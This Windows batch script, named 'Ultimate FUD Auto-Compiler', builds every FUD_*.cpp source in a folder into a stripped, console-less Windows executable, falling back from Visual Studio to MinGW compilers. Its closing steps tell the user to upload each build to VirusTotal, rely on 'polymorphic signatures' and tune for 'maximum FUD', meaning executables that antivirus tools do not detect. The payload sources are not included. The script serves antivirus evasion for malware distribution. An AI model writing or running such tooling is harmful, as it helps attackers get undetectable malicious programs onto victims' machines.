@echo off
echo ====================================================
echo Ultimate FUD Auto-Compiler v5.0 for Windows
echo ====================================================
echo.
echo This script automatically compiles all FUD_*.cpp files
echo into production-ready executables for VirusTotal testing.
echo.

set "compiled_count=0"
set "failed_count=0"

echo [AUTO-COMPILER] Starting compilation process...
echo.

for %%f in (FUD_*.cpp) do (
    echo [COMPILING] %%f...
    
    REM Try Visual Studio compiler first (best optimization)
    cl.exe /nologo /O2 /MT /GL /LTCG "%%f" /Fe:"%%~nf.exe" /link /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib >nul 2>&1
    
    if exist "%%~nf.exe" (
        echo [SUCCESS] Compiled: %%~nf.exe
        set /a compiled_count+=1
        
        REM Check file size to ensure it's a proper executable
        for %%A in ("%%~nf.exe") do (
            if %%~zA LSS 8192 (
                echo [WARNING] Small executable: %%~nf.exe ^(%%~zA bytes^) - May need optimization
            ) else (
                echo [VERIFIED] Production-ready: %%~nf.exe ^(%%~zA bytes^) - Ready for VirusTotal!
            )
        )
    ) else (
        REM Try MinGW GCC as fallback
        echo [RETRY] Trying MinGW compiler...
        gcc -O3 -s -static -ffunction-sections -fdata-sections -Wl,--gc-sections -mwindows "%%f" -o "%%~nf.exe" -luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 >nul 2>&1
        
        if exist "%%~nf.exe" (
            echo [SUCCESS] Compiled with MinGW: %%~nf.exe
            set /a compiled_count+=1
        ) else (
            REM Try simple GCC
            echo [RETRY] Trying simple GCC...
            gcc -O2 -s -mwindows "%%f" -o "%%~nf.exe" -luser32 -lkernel32 >nul 2>&1
            
            if exist "%%~nf.exe" (
                echo [SUCCESS] Compiled with simple GCC: %%~nf.exe
                set /a compiled_count+=1
            ) else (
                echo [FAILED] Could not compile: %%f
                echo [INFO] Manual compilation required:
                echo   cl /O2 /MT "%%f" /Fe:"%%~nf.exe" /link user32.lib
                echo   gcc -O2 -mwindows "%%f" -o "%%~nf.exe" -luser32
                set /a failed_count+=1
            )
        )
    )
    echo.
)

echo ====================================================
echo COMPILATION SUMMARY
echo ====================================================
echo Total files processed: %compiled_count% successful, %failed_count% failed
echo.

if %compiled_count% GTR 0 (
    echo [FUD READY] Successfully compiled executables:
    for %%f in (FUD_*.exe) do (
        for %%A in ("%%f") do (
            echo   %%f ^(%%~zA bytes^) - Ready for VirusTotal testing!
        )
    )
    echo.
    echo [NEXT STEPS]
    echo 1. Upload each .exe file to VirusTotal
    echo 2. Each file has unique polymorphic signature
    echo 3. Test different combinations for maximum FUD
    echo 4. Track results for optimization
    echo.
) else (
    echo [ERROR] No executables were compiled successfully.
    echo Please ensure you have a Windows compiler installed:
    echo - Visual Studio with C++ tools
    echo - MinGW-w64
    echo - Or use online compiler services
)

echo ====================================================
echo Auto-compilation process completed!
echo ====================================================
pause